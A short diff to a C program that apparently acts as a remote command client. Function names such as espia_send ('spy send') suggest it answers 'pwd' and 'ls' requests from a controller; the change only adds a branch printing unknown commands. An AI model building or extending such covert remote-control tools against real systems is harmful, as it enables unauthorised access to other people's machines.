@@ -49,6 +49,8 @@ int main() {
             espia_send(&connection, pwd_buff, sizeof(pwd_buff));
         } else if (strcmp(recv_buff, "ls") == 0) {
             ls(&connection);
+        } else {
+            printf("%s\n", recv_buff);
         }
     }
     /* ---------------------------------------------------- */
